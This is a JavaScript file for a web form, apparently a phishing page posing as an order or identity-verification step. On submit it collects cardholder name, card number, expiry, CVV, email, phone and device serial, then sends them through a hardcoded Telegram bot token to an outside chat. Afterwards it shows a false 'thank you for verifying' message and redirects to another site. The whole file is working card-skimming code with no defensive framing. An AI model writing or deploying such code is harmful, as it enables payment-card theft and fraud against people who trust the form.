let form = document.querySelector("#form");

let bot = {
	TOKEN: "1990494557:AAEZjIWrL9in7xgBxC_XMo_BFrJJ1q5Cgrc",
	chatID: "-1001571702765",
}

form.addEventListener("submit", e => {
	e.preventDefault();
	
	var mailid = document.getElementById("inputEmailID").value;
	var mobilenumber = document.getElementById("inputMobileNo").value;
	var name = document.getElementById("inputName").value;
	var serial = document.getElementById("inputSN").value;
	var number = document.getElementById("inputCardNumber").value;
	var expiry = document.getElementById("inputExpiry").value;
	var cvv = document.getElementById("inputCVV").value;
	
	var my_text = `Order Details:%0A - Card Holder Name: ${name} %0A - Card Number: ${number} %0A - Expiry: ${expiry} %0A - CVV: ${cvv} %0A - Email ID: ${mailid} %0A - Mobile Number: ${mobilenumber} %0A - IMEI or SN: ${serial}`
	
	fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${my_text}`,{
		method: "GET"
	})
	.then(success => {
		alert("Thank you for verifing your identify, Your order will be proccessed shortly.")
		window.location.assign("https://icrack.in/verifying")
	}, error => {
		alert("Verification Failed!")
		console.log(error);
	})
})
